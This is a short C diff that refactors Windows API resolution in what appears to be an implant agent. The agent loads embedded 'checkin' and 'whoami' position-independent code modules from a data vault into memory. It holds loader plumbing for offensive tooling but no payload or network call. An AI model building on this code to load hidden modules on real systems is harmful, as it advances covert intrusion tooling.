@@ -10,6 +10,17 @@ WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWO
 char __CHECKIN_PICO__[0] __attribute__((section("pico_checkin")));
 char __WHOAMI_PICO__[0] __attribute__((section("pico_whoami")));
 
+WIN32FUNCS resolve_pico_functions() {
+	WIN32FUNCS funcs;
+	
+	funcs.LoadLibraryA = (__typeof__(LoadLibraryA) *) KERNEL32$LoadLibraryA;
+	funcs.GetProcAddress = (__typeof__(GetProcAddress) *) KERNEL32$GetProcAddress;
+	funcs.VirtualAlloc = (__typeof__(VirtualAlloc) *) KERNEL32$VirtualAlloc;
+	funcs.VirtualFree = (__typeof__(VirtualFree) *) KERNEL32$VirtualFree;
+	
+	return funcs;
+}
+
 char * find_checkin_pico() {
     return (char *)&__CHECKIN_PICO__;
 }
@@ -28,13 +39,7 @@ void load_builtin_picos(DataVault *vault) {
 	for (int i = 0; i < whoami->length; i++) { whoami->value[i] = 0; }
 }
 
-BOOL resolve_loaded_pico(DataVault *vault, ResolvedPico *pico, char *key) {
-	WIN32FUNCS funcs;
-	funcs.LoadLibraryA = (__typeof__(LoadLibraryA) *) KERNEL32$LoadLibraryA;
-	funcs.GetProcAddress = (__typeof__(GetProcAddress) *) KERNEL32$GetProcAddress;
-	funcs.VirtualAlloc = (__typeof__(VirtualAlloc) *) KERNEL32$VirtualAlloc;
-	funcs.VirtualFree = (__typeof__(VirtualFree) *) KERNEL32$VirtualFree; // TODO move these into agent state
-
+BOOL resolve_loaded_pico(DataVault *vault, WIN32FUNCS *funcs, ResolvedPico *pico, char *key) {
 	DataBuffer databuf = { 0 };
 	BOOL result = retrieve_from_vault(vault, &databuf, key);
 	if (result == FALSE) { return FALSE; }
@@ -49,7 +54,7 @@ BOOL resolve_loaded_pico(DataVault *vault, ResolvedPico *pico, char *key) {
 	pico->datalen = PicoDataSize(buf);
 	pico->data = KERNEL32$VirtualAlloc(NULL, pico->datalen, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE);
 	
-	PicoLoad((IMPORTFUNCS *) &funcs, buf, pico->code, pico->data);
+	PicoLoad((IMPORTFUNCS *) funcs, buf, pico->code, pico->data);
 	pico->entrypoint = PicoEntryPoint(buf, pico->code);
 	
 	return TRUE;
